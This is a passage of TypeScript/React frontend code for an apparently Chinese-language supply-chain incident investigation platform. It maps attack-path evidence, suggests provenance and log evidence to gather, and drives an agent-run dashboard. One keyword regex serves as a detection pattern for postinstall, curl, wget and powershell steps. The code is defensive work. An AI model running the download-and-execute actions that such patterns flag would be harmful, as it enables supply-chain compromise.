  if (/artifact|attestation|provenance|slsa|digest|hash|cosign|产物|签名|可信/.test(normalized)) return 'artifact'
  if (/runtime|log|service|ip|dns|waf|edr|access|运行|日志|外联/.test(normalized)) return 'runtime'
  if (/code|file|function|route|sarif|reachability|代码|可达/.test(normalized)) return 'code'
  if (/asset|host|server|影响资产|资产/.test(normalized)) return 'asset'
  return 'other'
}

function attackStageTitle(kind: AttackChainStageKind, index: number) {
  const titles: Record<AttackChainStageKind, string> = {
    external: '外部告警入口',
    dependency: '依赖风险进入',
    build: '构建链传播',
    artifact: '产物可信校验',
    runtime: '运行期印证',
    code: '代码可达佐证',
    asset: '影响资产确认',
    other: index === 0 ? '可疑入口' : '证据关联',
  }
  return titles[kind]
}

function attackStageIcon(kind: AttackChainStageKind) {
  if (kind === 'external') return <FileSearch className='size-4 text-cyan-600' />
  if (kind === 'dependency') return <Boxes className='size-4 text-orange-600' />
  if (kind === 'build') return <GitPullRequestArrow className='size-4 text-cyan-600' />
  if (kind === 'artifact') return <Fingerprint className='size-4 text-emerald-600' />
  if (kind === 'runtime') return <ServerCog className='size-4 text-red-600' />
  if (kind === 'code') return <Code2 className='size-4 text-violet-600' />
  if (kind === 'asset') return <Network className='size-4 text-blue-600' />
  return <ShieldAlert className='size-4 text-amber-600' />
}

function attackStageClass(kind: AttackChainStageKind) {
  const classes: Record<AttackChainStageKind, string> = {
    external: 'border-cyan-200 dark:border-cyan-900',
    dependency: 'border-orange-200 dark:border-orange-900',
    build: 'border-sky-200 dark:border-sky-900',
    artifact: 'border-emerald-200 dark:border-emerald-900',
    runtime: 'border-red-200 dark:border-red-900',
    code: 'border-violet-200 dark:border-violet-900',
    asset: 'border-blue-200 dark:border-blue-900',
    other: 'border-amber-200 dark:border-amber-900',
  }
  return classes[kind]
}

function evidenceGroupsForAttackStage(kind: AttackChainStageKind, text: string) {
  const normalized = text.toLowerCase()
  const groups = new Set<string>()
  if (kind === 'dependency' || /dependency|package|vulnerability|sbom|vex|npm|pypi|依赖|组件|漏洞/.test(normalized)) groups.add('组件')
  if (kind === 'build' || /ci|cd|workflow|runner|action|构建|流水线/.test(normalized)) groups.add('CI/CD')
  if (kind === 'artifact' || /artifact|attestation|provenance|slsa|digest|hash|产物|签名/.test(normalized)) groups.add('产物')
  if (kind === 'runtime' || /runtime|log|service|ip|dns|waf|edr|access|运行|日志/.test(normalized)) groups.add('日志')
  if (kind === 'external' || /audio|visual|multimodal|ocr|asr|alert|告警|截图|录音|视频/.test(normalized)) groups.add('外部告警')
  if (kind === 'code' || /code|file|function|route|sarif|代码|可达/.test(normalized)) groups.add('代码')
  if (!groups.size) groups.add('其他')
  return Array.from(groups)
}

function pathEvidenceGaps(path: KnowledgeGraphAttackPath) {
  const explicitGaps = (path.gaps ?? []).filter(Boolean)
  if (explicitGaps.length) return explicitGaps
  if (path.verdict === 'likely-real-attack-path' || path.verdict === 'runtime-touched-risk') {
    return ['当前路径未发现明显证据缺口；可继续补充签名和时间线来增强审计可复现性。']
  }
  if (path.category === 'build-integrity-risk') {
    return ['缺少 provenance/attestation、产物哈希差异、builder identity 直接证据。']
  }
  if (path.category === 'application-exploitation') {
    return ['缺少来源 IP、完整 access/WAF 请求链路、漏洞点复现或调用栈证据。']
  }
  return ['缺少时间线、产物哈希、来源 IP 直接证据。']
}

function evidenceRecommendationsForPath(path: KnowledgeGraphAttackPath): EvidenceRecommendation[] {
  const nodeTypes = pathNodeTypes(path)
  const gapText = pathEvidenceGaps(path).join(' ')
  const trustText = (path.trust_chain ?? [])
    .map((item) => `${item.model || ''} ${item.claim || ''} ${item.status || ''} ${item.basis || ''}`)
    .join(' ')
  const checkText = (path.checks ?? [])
    .map((item) => `${item.id || ''} ${item.label || item.name || ''} ${item.status || ''} ${item.evidence || ''}`)
    .join(' ')
  const searchable = `${path.category} ${path.verdict || ''} ${gapText} ${trustText} ${checkText}`.toLowerCase()
  const keywords = extractPathKeywords(path)
  const items: EvidenceRecommendation[] = []

  const hasDependency = nodeTypes.has('DependencyPackage') || nodeTypes.has('Vulnerability') || searchable.includes('vex')
  const hasBuild = nodeTypes.has('CIStep') || nodeTypes.has('Workflow') || searchable.includes('workflow') || searchable.includes('runner')
  const hasArtifact = nodeTypes.has('BuildArtifact') || nodeTypes.has('Attestation') || /slsa|in-toto|attestation|provenance|digest|hash|cosign/.test(searchable)
  const hasRuntime = nodeTypes.has('RuntimeService') || nodeTypes.has('LogEvent') || /runtime|access|waf|edr|ip|dns/.test(searchable)
  const hasMultimodal = ['AudioEvidence', 'VisualEvidence', 'MultimodalEvidence', 'MultimodalFinding', 'RecognizedEntity'].some((type) => nodeTypes.has(type))

  if (hasDependency) {
    items.push({
      id: 'dependency-lineage',
      title: '依赖来源与锁文件证据',
      priority: '高',
      where: '仓库 package-lock / pnpm-lock / requirements、私有源配置、registry 下载记录',
      uploadTo: '供应链风险发现',
      proves: '证明可疑依赖是否真实进入项目、是否来自预期仓库或私有源，降低依赖混淆和版本异常误报。',
      examples: ['package-lock.json', 'requirements.txt', '.npmrc', 'SBOM CycloneDX', 'registry audit log'],
      keywords: pickKeywords(keywords, ['package', 'dependency', 'version', 'registry']),
      referenceModel: 'GUAC / CycloneDX / VEX',
    })
  }

  if (hasBuild) {
    items.push({
      id: 'cicd-job-log',
      title: 'CI/CD 构建日志与 workflow 证据',
      priority: '高',
      where: 'GitHub Actions / Jenkins / GitLab CI 的 workflow run、job log、runner log',
      uploadTo: 'CI/CD 构建链',
      proves: '证明可疑依赖、脚本或第三方 Action 是否在构建阶段执行，以及 runner 和权限是否可信。',
      examples: ['workflow yaml', 'job log', 'runner diagnostic log', 'Action commit SHA', 'permissions 配置'],
      keywords: pickKeywords(keywords, ['workflow', 'runner', 'action', 'job', 'script']),
      referenceModel: 'SLSA / in-toto / GitHub Actions hardening',
    })
  }

  if (hasArtifact) {
    items.push({
      id: 'artifact-provenance',
      title: '产物哈希与 provenance/attestation',
      priority: '高',
      where: 'release artifact、SLSA provenance、in-toto attestation、cosign 或 gh attestation',
      uploadTo: '产物可信',
      proves: '证明产物是否由声明源码、workflow 和 builder 生成，确认 artifact digest 是否被替换或缺失。',
      examples: ['artifact SHA256', 'attestation JSONL', 'SLSA provenance', 'cosign verify-attestation', 'gh attestation verify'],
      keywords: pickKeywords(keywords, ['artifact', 'sha', 'digest', 'provenance', 'attestation']),
      referenceModel: 'SLSA / in-toto / Sigstore Cosign',
    })
  }

  if (hasRuntime) {
    items.push({
      id: 'runtime-corroboration',
      title: '运行期日志与外联证据',
      priority: gapText.includes('运行期') || gapText.includes('来源 IP') ? '高' : '中',
      where: 'Nginx/access log、应用日志、K8s pod log、EDR/WAF、DNS、VPC Flow Log',
      uploadTo: '日志印证',
      proves: '证明构建或依赖风险是否已经触达到运行环境，并定位来源 IP、目的域名、接口和时间窗。',
      examples: ['access.log', 'app.log', 'pod log', 'EDR network event', 'DNS query log', 'VPC Flow Log'],
      keywords: pickKeywords(keywords, ['ip', 'domain', 'service', 'api', 'time']),
      referenceModel: 'Sigma / Wazuh / Runtime evidence',
    })
  }

  if (hasMultimodal) {
    items.push({
      id: 'multimodal-corroboration',
      title: '外部告警证据',
      priority: hasRuntime ? '中' : '高',
      where: 'EDR/WAF 告警截图、运维群截图、终端安装日志截图、会议录音或排查视频',
      uploadTo: '外部告警证据',
      proves: '把非结构化材料中的包名、IP、命令和服务名抽取成实体，辅助验证路径是否真实可达。',
      examples: ['CI 报错截图', '安全告警截图', 'IOC 表格截图', 'OCR 文本', 'ASR 转写文本'],
      keywords: pickKeywords(keywords, ['ocr', 'asr', 'command', 'package', 'ip']),
      referenceModel: 'Sigma / Wazuh / OCR-ASR evidence',
    })
  }

  if (path.category === 'application-exploitation' || nodeTypes.has('CodeFile')) {
    items.push({
      id: 'code-reachability',
      title: '可达性佐证与请求链证据',
      priority: '中',
      where: '代码仓库、SARIF、Web access log、WAF 告警、调用链或 APM trace',
      uploadTo: '可达性佐证 / 日志印证',
      proves: '证明运行期请求是否真正触达具体代码风险点，帮助区分真实利用和普通扫描噪声。',
      examples: ['SARIF', '函数调用栈', 'APM trace', 'WAF event', 'HTTP request log'],
      keywords: pickKeywords(keywords, ['api', 'route', 'file', 'function', 'request']),
      referenceModel: 'SARIF / VEX reachability',
    })
  }

  if (!items.length) {
    items.push({
      id: 'generic-timeline',
      title: '时间线与原始证据包',
      priority: '中',
      where: '当前项目仓库、构建平台、日志平台和安全设备的同一时间窗材料',
      uploadTo: '攻击链地图',
      proves: '补齐事件发生顺序，让可疑节点从孤立告警升级为可复核的溯源路径。',
      examples: ['事件时间线', '原始日志', '扫描报告', '截图证据', '处置记录'],
      keywords: keywords.slice(0, 8),
      referenceModel: 'GUAC / Evidence graph',
    })
  }

  return dedupeEvidenceRecommendations(items)
}

function pathNodeTypes(path: KnowledgeGraphAttackPath) {
  const types = new Set<string>()
  path.path_steps?.forEach((step) => {
    if (step.source_type) types.add(step.source_type)
    if (step.target_type) types.add(step.target_type)
  })
  path.trust_chain?.forEach((item) => {
    const model = `${item.model || ''} ${item.claim || ''}`.toLowerCase()
    if (model.includes('slsa') || model.includes('provenance')) types.add('BuildArtifact')
    if (model.includes('in-toto') || model.includes('attestation')) types.add('Attestation')
    if (model.includes('runtime')) types.add('LogEvent')
    if (model.includes('guac')) types.add('DependencyPackage')
  })
  return types
}

function extractPathKeywords(path: KnowledgeGraphAttackPath) {
  const values: string[] = [
    path.title,
    path.category,
    path.verdict || '',
    path.entry_node_id || '',
    path.target_node_id || '',
    ...(path.node_ids ?? []),
    ...(path.evidence_ids ?? []),
  ]
  path.path_steps?.forEach((step) => {
    values.push(step.source || '', step.target || '', step.relationship || '', step.edge_type || '', step.why_abusable || '', step.trust_basis || '')
  })
  path.evidence_summary?.forEach((item) => {
    values.push(item.title || '', item.detail || '', item.source || '', item.source_model || '')
  })
  path.trust_chain?.forEach((item) => {
    values.push(item.model || '', item.subject || '', item.basis || '')
  })

  const text = values.join(' ')
  const tokens = [
    ...text.match(/@[a-z0-9_.-]+\/[a-z0-9_.-]+(?:@[a-z0-9_.-]+)?/gi) ?? [],
    ...text.match(/\b(?:npm|pkg|pypi):[a-z0-9_.@/-]+/gi) ?? [],
    ...text.match(/\b\d{1,3}(?:\.\d{1,3}){3}\b/g) ?? [],
    ...text.match(/\b[a-z0-9][a-z0-9.-]+\.(?:prod|com|net|org|invalid|local)\b/gi) ?? [],
    ...text.match(/\b[A-Fa-f0-9]{7,64}\b/g) ?? [],
    ...text.match(/\b[\w./-]+(?:\.ya?ml|\.jsonl?|\.tar\.gz|\.zip|\.whl|\.lock|\.txt)\b/g) ?? [],
    ...text.match(/\/[a-z0-9_./?=&%-]+/gi) ?? [],
    ...text.match(/\b(?:postinstall|curl|wget|powershell|runner|workflow|attestation|provenance|digest|checkout-api|deploy-prod-\d+)\b/gi) ?? [],
  ]
  return Array.from(new Set(tokens.map((token) => token.trim()).filter((token) => token.length > 1))).slice(0, 18)
}

function pickKeywords(keywords: string[], hints: string[]) {
  const hintText = hints.join('|').toLowerCase()
  const preferred = keywords.filter((keyword) => {
    const lower = keyword.toLowerCase()
    if (hintText.includes('ip') && /^\d{1,3}(?:\.\d{1,3}){3}$/.test(lower)) return true
    if (hintText.includes('api') && lower.startsWith('/')) return true
    return hints.some((hint) => lower.includes(hint.toLowerCase()))
  })
  const result = [...preferred, ...keywords]
  return Array.from(new Set(result)).slice(0, 8)
}

function dedupeEvidenceRecommendations(items: EvidenceRecommendation[]) {
  const priorityRank: Record<EvidenceRecommendationPriority, number> = { 高: 0, 中: 1, 低: 2 }
  const byId = new Map<string, EvidenceRecommendation>()
  items.forEach((item) => {
    const existing = byId.get(item.id)
    if (!existing || priorityRank[item.priority] < priorityRank[existing.priority]) {
      byId.set(item.id, item)
    }
  })
  return Array.from(byId.values()).sort((left, right) => {
    const priorityDelta = priorityRank[left.priority] - priorityRank[right.priority]
    if (priorityDelta !== 0) return priorityDelta
    return left.title.localeCompare(right.title, 'zh-CN')
  })
}

function upgradeHintForPath(path: KnowledgeGraphAttackPath) {
  const artifact = pathEndpointLabel(path, 'BuildArtifact') || '构建产物'
  const service = pathEndpointLabel(path, 'RuntimeService') || '运行服务'
  const log = pathEndpointLabel(path, 'LogEvent') || '运行期异常日志'
  const confidence = Math.round((path.confidence ?? 0) * 100)

  if (path.verdict === 'likely-real-attack-path' || path.verdict === 'runtime-touched-risk') {
    return `当前已接近高可信；继续补充 ${artifact} 的签名、部署时间线和 ${log} 的原始日志，可把 ${confidence}% 置信度固化为可审计证据。`
  }
  if (path.category === 'build-integrity-risk') {
    return `补充 ${artifact} 的 subject digest、builder identity、materials 清单和 in-toto/SLSA attestation，可把构建可信链风险升级为高可信路径。`
  }
  if (path.category === 'application-exploitation') {
    return `补充来源 IP、完整请求时间线、WAF/access 原始日志和漏洞复现证据，可证明运行期请求确实触达代码风险点。`
  }
  return `补充 ${artifact} 的哈希差异、provenance/attestation、${service} 上线后同时间窗的 ${log}，可把当前可疑路径升级为高可信真实路径。`
}

function pathEndpointLabel(path: KnowledgeGraphAttackPath, nodeType: string) {
  const fromStep = path.path_steps?.find((step) => step.target_type === nodeType)?.target
  if (fromStep) return fromStep
  return path.path_steps?.find((step) => step.source_type === nodeType)?.source
}

function getPathStartNodeRef(path?: KnowledgeGraphAttackPath | null) {
  if (!path) return null
  return path.entry_node_id || path.path_steps?.[0]?.source || path.node_ids?.[0] || null
}

function pathStartLabel(path: KnowledgeGraphAttackPath) {
  const firstStep = path.path_steps?.[0]
  if (firstStep?.source) return shortPathLabel(firstStep.source)
  return shortPathLabel(pathEndpointLabel(path, 'DependencyPackage') || path.entry_node_id || '起点待确认')
}

function pathStartFullLabel(path: KnowledgeGraphAttackPath) {
  const firstStep = path.path_steps?.[0]
  return firstStep?.source || pathEndpointLabel(path, 'DependencyPackage') || path.entry_node_id || '起点待确认'
}

function pathEndFullLabel(path: KnowledgeGraphAttackPath) {
  const steps = path.path_steps ?? []
  const lastStep = steps[steps.length - 1]
  return lastStep?.target || pathEndpointLabel(path, 'RuntimeService') || path.target_node_id || '终点待确认'
}

function shortPathLabel(value: string) {
  return value
}

function isTrustProvenancePath(path?: KnowledgeGraphAttackPath | null) {
  if (!path) return false
  return (
    path.verdict === 'verified-provenance-chain' ||
    path.category === 'verified-provenance-chain' ||
    path.category === 'artifact-trust'
  )
}

function isVerifiedProvenancePath(path?: KnowledgeGraphAttackPath | null) {
  return path?.verdict === 'verified-provenance-chain'
}

function trustedProvenanceChecks(path: KnowledgeGraphAttackPath) {
  const explicitChecks = path.checks?.filter(Boolean) ?? []
  if (explicitChecks.length) return explicitChecks
  return [
    { id: 'artifact_digest_matches_subject', label: 'Digest', status: 'pass', value: '匹配', evidence: '产物 SHA256 与 attestation subject digest 匹配。' },
    { id: 'source_repository_allowed', label: 'Repo', status: 'pass', value: '匹配', evidence: '来源仓库匹配发布策略。' },
    { id: 'commit_matches_expected', label: 'Commit', status: 'pass', value: '匹配', evidence: 'commit/ref 由 provenance 声明并匹配策略。' },
    { id: 'workflow_allowed', label: 'Workflow', status: 'pass', value: '允许', evidence: 'release workflow 位于允许列表。' },
    { id: 'builder_trusted', label: 'Builder', status: 'pass', value: '可信', evidence: 'builder.id 位于企业可信 builder 列表。' },
    { id: 'runner_environment_trusted', label: 'Runner', status: 'pass', value: 'github-hosted', evidence: 'runner 环境满足策略要求。' },
    { id: 'provenance_predicate_type_slsa', label: 'Predicate', status: 'pass', value: 'SLSA', evidence: 'attestation 使用 SLSA provenance predicate。' },
    { id: 'attestation_max_age', label: 'Attestation', status: 'pass', value: '新鲜', evidence: 'attestation 时间在策略窗口内。' },
    { id: 'artifact_hash_baseline', label: 'Hash baseline', status: 'skipped', value: '未配置基线', evidence: '无历史 hash 基线时不作为阻断项。' },
    { id: 'signature_verified', label: 'Signature', status: 'pass', value: 'gh attestation verify 通过', evidence: '签名验证命令返回通过。' },
  ]
}

function isTrustCheckPassLike(status?: string) {
  return status === 'pass' || status === 'skipped'
}

function trustCheckStatusLabel(status?: string) {
  if (status === 'pass') return '通过'
  if (status === 'skipped') return '已跳过'
  if (status === 'warn') return '需复核'
  if (status === 'missing') return '缺失'
  if (status === 'fail') return '失败'
  return status || '待确认'
}

function graphNodeFilters(
  nodes: KnowledgeGraphNode[],
  counts: Map<string, number>
) {
  const discoveredTypes = Array.from(new Set(nodes.map((node) => node.type).filter(Boolean)))
  const orderedTypes = [
    ...graphNodeTypeOrder.filter((type) => discoveredTypes.includes(type)),
    ...discoveredTypes.filter((type) => !graphNodeTypeOrder.includes(type)).sort(),
  ]
  return [
    { type: null, label: '全部节点', count: nodes.length },
    ...orderedTypes.map((type) => ({
      type,
      label: graphNodeTypeLabel(type),
      count: counts.get(type) ?? 0,
    })),
  ]
}

function graphNodeGroupFilters(nodes: KnowledgeGraphNode[]) {
  const counts = new Map<string, number>()
  nodes.forEach((node) => {
    const group = graphNodeGroupForType(node.type)
    counts.set(group, (counts.get(group) ?? 0) + 1)
  })
  const groups = [
    { group: null, label: '全部证据', count: nodes.length },
    { group: 'component', label: '组件与漏洞', count: counts.get('component') ?? 0 },
    { group: 'build', label: '构建与产物', count: counts.get('build') ?? 0 },
    { group: 'runtime', label: '运行与日志', count: counts.get('runtime') ?? 0 },
    { group: 'multimodal', label: '外部告警证据', count: counts.get('multimodal') ?? 0 },
    { group: 'attack', label: '攻击阶段', count: counts.get('attack') ?? 0 },
    { group: 'other', label: '其他证据', count: counts.get('other') ?? 0 },
  ]
  return groups.filter((group) => group.group === null || group.count > 0)
}

function graphNodeGroupForType(type: string) {
  if (['DependencyPackage', 'Vulnerability', 'Finding'].includes(type)) return 'component'
  if (['CIStep', 'BuildArtifact', 'SourceCommit', 'Workflow', 'TrustedBuilder', 'Attestation'].includes(type)) return 'build'
  if (['RuntimeService', 'LogEvent', 'Asset'].includes(type)) return 'runtime'
  if (['AudioEvidence', 'VisualEvidence', 'MultimodalEvidence', 'MultimodalFinding', 'RecognizedEntity'].includes(type)) {
    return 'multimodal'
  }
  if (type === 'AttackStage') return 'attack'
  return 'other'
}

function countGraphNodeTypes(nodes: KnowledgeGraphNode[]) {
  const counts = new Map<string, number>()
  nodes.forEach((node) => counts.set(node.type, (counts.get(node.type) ?? 0) + 1))
  return counts
}

function graphNodeTypeLabel(type: string) {
  const labels: Record<string, string> = {
    CodeFile: '代码文件',
    DependencyPackage: '依赖包',
    Vulnerability: '漏洞/公告',
    CIStep: 'CI/CD 步骤',
    BuildArtifact: '构建产物',
    RuntimeService: '运行服务',
    LogEvent: '日志事件',
    AudioEvidence: '音频证据',
    VisualEvidence: '视觉证据',
    MultimodalEvidence: '多模态证据',
    MultimodalFinding: '多模态发现',
    RecognizedEntity: '识别实体',
    Finding: '安全发现',
    AttackStage: '攻击阶段',
    SourceCommit: '源码提交',
    Workflow: '发布工作流',
    TrustedBuilder: '可信构建器',
    Attestation: '可信声明',
    EvidenceChain: '证据链',
    Asset: '资产',
  }
  return labels[type] || type
}

function filterGraphNodesBySearch(nodes: KnowledgeGraphNode[], query: string) {
  const normalizedQuery = query.trim().toLowerCase()
  if (!normalizedQuery) return nodes
  return nodes.filter((node) => graphNodeSearchText(node).includes(normalizedQuery))
}

function graphNodeSearchText(node: KnowledgeGraphNode) {
  const propertyText = stringifySearchValue(node.properties)
  return [
    node.id,
    node.label,
    node.type,
    node.risk,
    node.description,
    node.source,
    node.source_model,
    propertyText,
  ]
    .filter(Boolean)
    .join(' ')
    .toLowerCase()
}

function stringifySearchValue(value: unknown): string {
  if (value == null) return ''
  if (typeof value === 'string') return value
  if (typeof value === 'number' || typeof value === 'boolean') return String(value)
  try {
    return JSON.stringify(value)
  } catch {
    return String(value)
  }
}

function filterGraphEdgesForNodes(
  edges: KnowledgeGraphEdge[],
  nodes: KnowledgeGraphNode[]
) {
  const nodeIds = new Set(nodes.map((node) => node.id))
  return edges.filter((edge) => nodeIds.has(edge.source) && nodeIds.has(edge.target))
}

function pathVerdictLabel(verdict?: string) {
  if (verdict === 'likely-real-attack-path') return '高度可信真实路径'
  if (verdict === 'plausible-attack-path') return '可疑真实路径'
  if (verdict === 'runtime-touched-risk') return '运行期已触达'
  if (verdict === 'plausible-runtime-touch') return '疑似运行期触达'
  if (verdict === 'provenance-risk-path') return '构建可信链风险'
  if (verdict === 'verified-provenance-chain') return '可信证明链已验证'
  if (verdict === 'insufficient-evidence') return '证据不足'
  return '路径待判定'
}

function pathVerdictClass(verdict?: string) {
  if (verdict === 'verified-provenance-chain') return statusClasses.active
  if (verdict === 'likely-real-attack-path' || verdict === 'runtime-touched-risk') {
    return severityClasses.critical
  }
  if (verdict === 'plausible-attack-path' || verdict === 'provenance-risk-path') {
    return severityClasses.high
  }
  if (verdict === 'plausible-runtime-touch') return severityClasses.medium
  return statusClasses.observed
}

function isEvidenceSupportEdge(type?: string) {
  return [
    'LOG_SUPPORTS_FINDING',
    'FINDING_AFFECTS',
    'FINDING_MAPS_TO_ATTACK_STAGE',
    'HAS_VULNERABILITY',
  ].includes(type || '')
}

const defaultAgentSteps: AgentRunStep[] = [
  { id: 'code_audit', name: '可达性佐证', description: '扫描代码、密钥和配置风险', status: 'pending', durationSeconds: 0, input: {}, summary: {}, error: '' },
  { id: 'dependency_audit', name: '供应链风险发现', description: '生成 SBOM/VEX 并识别依赖风险', status: 'pending', durationSeconds: 0, input: {}, summary: {}, error: '' },
  { id: 'cicd_audit', name: 'CI/CD 构建链', description: '检查 workflow、权限和构建链路', status: 'pending', durationSeconds: 0, input: {}, summary: {}, error: '' },
  { id: 'artifact_trust', name: '产物可信', description: '校验 artifact 和 provenance', status: 'pending', durationSeconds: 0, input: {}, summary: {}, error: '' },
  { id: 'log_audit', name: '日志印证', description: '用运行期日志印证风险', status: 'pending', durationSeconds: 0, input: {}, summary: {}, error: '' },
  { id: 'multimodal_audit', name: '多模态证据', description: '分析上传图片中的 OCR 和安全信号', status: 'pending', durationSeconds: 0, input: {}, summary: {}, error: '' },
  { id: 'workspace_report', name: '图谱与报告', description: '汇总攻击路径和溯源报告', status: 'pending', durationSeconds: 0, input: {}, summary: {}, error: '' },
]

const agentInvestigationStages: AgentInvestigationStage[] = [
  {
    id: 'dependency',
    title: '依赖异常',
    subtitle: '识别组件版本异常、漏洞命中和依赖混淆信号',
    moduleTab: 'supply',
    stepIds: ['dependency_audit'],
    icon: <PackageCheck className='size-4' />,
    evidenceLabel: 'SBOM / VEX / lockfile',
    successCriteria: '定位可疑包、受影响资产和可达性线索',
  },
  {
    id: 'cicd',
    title: 'CI/CD 构建风险',
    subtitle: '检查 workflow 权限、Action 引用、runner 与远程脚本',
    moduleTab: 'pipeline',
    stepIds: ['cicd_audit'],
    icon: <GitBranch className='size-4' />,
    evidenceLabel: 'workflow / job log / runner',
    successCriteria: '判断污染是否可能在构建阶段引入',
  },
  {
    id: 'artifact',
    title: '产物可信异常',
    subtitle: '核验 artifact digest、provenance、builder 和签名',
    moduleTab: 'artifact',
    stepIds: ['artifact_trust'],
    icon: <Fingerprint className='size-4' />,
    evidenceLabel: 'artifact / attestation',
    successCriteria: '确认产物是否由可信来源和可信构建链生成',
  },
  {
    id: 'logs',
    title: '日志印证',
    subtitle: '用构建日志、运行日志和外联行为印证风险是否触发',
    moduleTab: 'logs',
    stepIds: ['log_audit'],
    icon: <FileSearch className='size-4' />,
    evidenceLabel: 'runtime log / access log',
    successCriteria: '证明可疑行为是否到达运行环境',
  },
  {
    id: 'multimodal',
    title: '多模态证据',
    subtitle: '识别截图中的 OCR 文本、实体和安全规则命中',
    moduleTab: 'multimodal',
    stepIds: ['multimodal_audit'],
    icon: <Images className='size-4' />,
    evidenceLabel: '截图 / 图片附件',
    successCriteria: '把图片中的外部告警和界面证据纳入研判',
  },
  {
    id: 'graph',
    title: '攻击路径生成',
    subtitle: '把组件、构建、产物和日志证据串成可解释路径',
    moduleTab: 'graph',
    stepIds: ['workspace_report'],
    icon: <Network className='size-4' />,
    evidenceLabel: 'attack path / report',
    successCriteria: '输出攻击路径、证据缺口和处置优先级',
  },
]

function AgentCommandCenter({
  workspace,
  onWorkspaceUpdated,
}: {
  workspace: SecurityWorkspace
  onWorkspaceUpdated: (workspace: SecurityWorkspace) => void
}) {
  const [targetPreset, setTargetPreset] = useState<AgentTargetPreset>('3cx')
  const [form, setForm] = useState<AgentFormState>(() => agentFormFromRequest(agentPresetRequests['3cx']))
  const [attachments, setAttachments] = useState<AgentAttachment[]>([])
  const [attachmentBusy, setAttachmentBusy] = useState(false)
  const attachmentInputRef = useRef<HTMLInputElement>(null)
  const [advancedOpen, setAdvancedOpen] = useState(false)
  const [agentBusy, setAgentBusy] = useState(false)
  const [agentRun, setAgentRun] = useState<AgentRunResult | null>(null)
  const [selectedGap, setSelectedGap] = useState<AgentEvidenceGap | null>(null)

  useEffect(() => {
    loadLatestSecurityAgentJob()
      .then((result) => {
        if (result.runId) setAgentRun(result)
      })
      .catch(() => undefined)
  }, [])

  function selectTarget(value: AgentTargetPreset) {
    setTargetPreset(value)
    if (value === 'manual') {
      setForm({
        ...emptyAgentForm,
        targetPath: workspaceTargetPath(workspace),
        expectedRepo: workspace.workspace.repository,
        expectedCommit: workspace.workspace.commit,
      })
      return
    }
    setForm(agentFormFromRequest(agentPresetRequests[value]))
  }

  async function addAttachments(files: File[]) {
    if (!files.length || attachmentBusy) return
    setAttachmentBusy(true)
    try {
      const result = await uploadAgentAttachments(files, getWorkspaceId(workspace))
      setAttachments((current) => [...current, ...result.attachments])
      toast.success(`已上传 ${result.attachments.length} 个附件，提交任务时将自动选择相关模块`)
    } catch (error) {
      toast.error(error instanceof Error ? error.message : 'Agent 附件上传失败')
    } finally {
      setAttachmentBusy(false)
      if (attachmentInputRef.current) attachmentInputRef.current.value = ''
    }
  }

  async function startAgentRun() {
    if (!form.targetPath.trim() && !attachments.length) {
      toast.error('请填写项目路径，或先上传日志/图片附件')
      return
    }
    setAgentBusy(true)
    try {
      const workspaceId = getWorkspaceId(workspace)
      const request = {
        ...agentRequestFromForm(form),
        workspaceId,
        ...(attachments.length ? { attachmentPaths: attachments.map((item) => item.path) } : {}),
      }
      const created = await createSecurityAgentJob(request)
      setAgentRun(created)
      toast.success('Agent 任务已创建，开始实时轮询调查进度')

      let result = created
      while (result.runId && ['queued', 'running'].includes(result.status)) {
        await sleep(1000)
        result = await loadSecurityAgentJob(result.runId)
        setAgentRun(result)
        if (result.workspace) onWorkspaceUpdated(result.workspace)
      }

      const finalWorkspace = await loadWorkspaceUntilModulePayloads(
        workspaceId,
        result.workspace,
        result.runId
      )
      if (finalWorkspace) {
        result = { ...result, workspace: finalWorkspace }
        setAgentRun(result)
        onWorkspaceUpdated(finalWorkspace)
      }
      if (result.status === 'success') {
        toast.success(`智能溯源完成，生成 ${result.workspace?.summary.attack_paths ?? 0} 条攻击路径`)
      } else if (result.status === 'completed_with_risk') {
        toast.warning(`智能溯源完成，发现风险信号，生成 ${result.workspace?.summary.attack_paths ?? 0} 条攻击路径`)
      } else if (result.status === 'needs_input') {
        toast.warning('智能溯源已形成初步判断，但还需要补充证据后才能闭环')
      } else if (result.status === 'partial') {
        toast.warning('智能溯源已完成，但部分步骤跳过或失败，请查看证据缺口')
      } else {
        toast.error(result.error || '智能溯源任务未成功完成')
      }
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '智能溯源执行失败')
    } finally {
      setAgentBusy(false)
    }
  }

  const steps = agentRun?.steps?.length ? agentRun.steps : defaultAgentSteps
  const gaps = agentRun?.evidenceGaps ?? []
  const actions = visibleAgentNextActions(agentRun?.nextActions)
  const commandSummary = agentCommandSummary(workspace, agentRun, agentBusy)
  const topPaths = (agentRun?.workspace?.graph?.attack_paths ?? workspace.graph?.attack_paths ?? [])
    .filter((path) => !isTrustProvenancePath(path))
    .slice()
    .sort((a, b) => (b.confidence ?? 0) - (a.confidence ?? 0))
    .slice(0, 3)
  const targetLabel = agentTargetPresetLabel(targetPreset)

  async function handleAgentAction(action: AgentNextAction) {
    if (action.actionKind === 'export_evidence_package') {
      if (!agentRun?.runId) {
        toast.error('请先执行一次 Agent 任务')
        return
      }
      try {
        const blob = await downloadAgentEvidencePackage(agentRun.runId)
        downloadBlob(blob, `${agentRun.runId}-evidence-package.zip`)
        toast.success('证据包已导出')
      } catch (error) {
        toast.error(error instanceof Error ? error.message : '证据包导出失败')
      }
      return
    }
    if (action.actionKind === 'open_evidence_gap') {
      const gapId = typeof action.payload?.gapId === 'string' ? action.payload.gapId : ''
      const gap = gaps.find((item) => item.id === gapId) ?? gaps[0]
      if (gap) setSelectedGap(gap)
      return
    }
    if (action.actionKind === 'review_high_risk_dependencies') {
      jumpToPlatformTab('supply')
      return
    }
    if (action.actionKind === 'rerun_artifact_trust') {
      jumpToPlatformTab('artifact')
      return
    }
    if (action.actionKind === 'scan_logs') {
      jumpToPlatformTab('logs')
      return
    }
    jumpToModuleName(action.targetModule)
  }

  return (
    <div className='space-y-4'>
      <Card className='overflow-hidden rounded-md border-slate-200 bg-[linear-gradient(135deg,rgba(8,47,73,0.04),rgba(14,165,233,0.04)_45%,rgba(255,255,255,0))]'>
        <CardContent className='p-4 sm:p-5'>
          <div className='grid gap-4 xl:grid-cols-[minmax(0,1fr)_auto] xl:items-center'>
            <div className='flex min-w-0 items-start gap-3'>
              <div className='grid size-11 shrink-0 place-items-center rounded-md border bg-slate-950 text-cyan-300 shadow-sm'>
                <Bot className='size-5' />
              </div>
              <div className='min-w-0'>
                <div className='flex flex-wrap items-center gap-2'>
                  <h2 className='text-base font-semibold'>Agent Command Center</h2>
                  <Badge variant='outline' className={cn('rounded-md', agentRunStatusClass(agentRun?.status, agentBusy))}>
